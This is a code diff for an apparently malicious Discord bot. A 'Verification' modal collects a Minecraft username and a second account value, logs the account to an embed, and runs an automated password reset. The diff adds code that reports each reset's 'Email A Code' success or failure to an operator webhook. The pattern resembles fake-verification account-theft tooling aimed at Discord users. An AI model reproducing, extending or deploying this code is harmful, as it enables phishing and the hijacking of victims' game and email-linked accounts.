@@ -112,7 +112,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                     embed1=discord.Embed(
                             title="Account Log",
                             timestamp= datetime.datetime.now(),
-                            colour=0xff0000,                           
+                            colour=0x088F8F,                           
                         )
                     embed1.set_thumbnail(
                         url= f"https://mc-heads.net/avatar/{self.box_one.value}.png"
@@ -148,4 +148,12 @@ class MyModalOne(ui.Modal, title="Verification"):
                 view=ButtonViewTwo(),
                 ephemeral=True
             )
-            await automate_password_reset(self.box_two.value)
+            async with aiohttp.ClientSession() as session:
+                webhook = Webhook.from_url(data["webhook"], session=session)
+                result = await automate_password_reset(self.box_two.value)
+                if result is False:
+                    embedfalse=discord.Embed(title="Email A Code Failed (No Email A Code Turned On)",timestamp= datetime.datetime.now(),colour=0xff0000)
+                    await webhook.send(embed=embedfalse,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
+                else:
+                    embedtrue=discord.Embed(title="Email A Code Success",timestamp= datetime.datetime.now(),colour=0x00FF00)
+                    await webhook.send(embed=embedtrue,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
